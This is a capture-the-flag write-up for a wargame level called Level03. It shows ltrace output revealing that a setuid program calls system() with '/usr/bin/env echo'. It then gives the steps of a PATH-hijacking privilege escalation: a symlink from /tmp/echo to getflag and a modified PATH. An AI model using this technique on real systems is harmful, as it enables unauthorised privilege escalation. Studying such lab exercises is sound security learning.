# Level03

## Initial Check

When logged in as the Level03 user, we find a file named `level03` in the directory. First, we examine this file using the `ltrace` command.

```bash
ltrace ./level03
__libc_start_main(0x080484a4, 1, 0xbffff854, 0x08048510, 0x08048580 <unfinished ...>
getegid()                                      = 2003
geteuid()                                      = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me")        <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed>                           = 0
+++ exited (status 0) +++
```

## Analysis

1. When executed, the program runs the command `/usr/bin/env echo Exploit me` using the `system()` function
2. This command will use the first `echo` command found in the PATH variable
3. We can manipulate the PATH variable to execute our desired command

## Solution Steps

1. First, we create a fake `echo` command in the `/tmp/` directory:
```bash
ln -s /bin/getflag /tmp/echo
```

2. We update the PATH variable to include the `/tmp/` directory:
```bash
export PATH=/tmp/:$PATH
```

3. We run the program:
```bash
./level03
```

## Explanation

In this level, we exploit a privilege escalation vulnerability by manipulating the PATH variable. When the program executes the `echo` command, it checks the directories specified in the PATH variable sequentially. By adding the `/tmp/` directory to the beginning of PATH, we make the program execute our fake `echo` command (which is actually a symbolic link to the `getflag` command).
